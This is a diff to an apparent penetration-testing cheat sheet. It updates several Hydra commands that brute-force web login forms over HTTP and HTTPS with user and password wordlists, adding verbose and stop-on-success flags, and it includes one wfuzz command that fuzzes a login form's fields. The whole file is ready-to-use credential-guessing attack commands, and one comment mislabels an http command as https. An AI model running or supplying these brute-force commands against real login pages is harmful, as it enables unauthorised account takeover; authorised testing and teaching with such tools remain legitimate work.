@@ -1,8 +1,8 @@
 HYDRA
-hydra -l user -P pass_wordlist ip http-post-form "/path/login.php:username=admin&password=^PASS^:Invalid Password!" # http form with single login
-hydra -L users_wordlist -P pass_wordlist ip http-post-form "/path/login.php:username=^USER^&password=^PASS^:Invalid Password!" # http form with multi logins
-hydra -l user -P pass_wordlist ip https-post-form "/path/login.php:username=admin&password=^PASS^:Invalid Password!" # https form with single login
-hydra -L users_wordlist -P pass_wordlist ip http-post-form "/path/login.php:username=^USER^&password=^PASS^:Invalid Password!" # https form with multi logins
+hydra -V -f -l user -P pass_wordlist ip http-post-form "/path/login.php:username=admin&password=^PASS^:Invalid Password!" # http form with single login
+hydra -V -f -L users_wordlist -P pass_wordlist ip http-post-form "/path/login.php:username=^USER^&password=^PASS^:Invalid Password!" # http form with multi logins
+hydra -V -f -l user -P pass_wordlist ip https-post-form "/path/login.php:username=admin&password=^PASS^:Invalid Password!" # https form with single login
+hydra -V -f -L users_wordlist -P pass_wordlist ip http-post-form "/path/login.php:username=^USER^&password=^PASS^:Invalid Password!" # https form with multi logins
 
 WFUZZ
 wfuzz -c -z file,path -hh nubmer -d  "log=FUZZ&pwd=aaaaa" http://ip/login.php
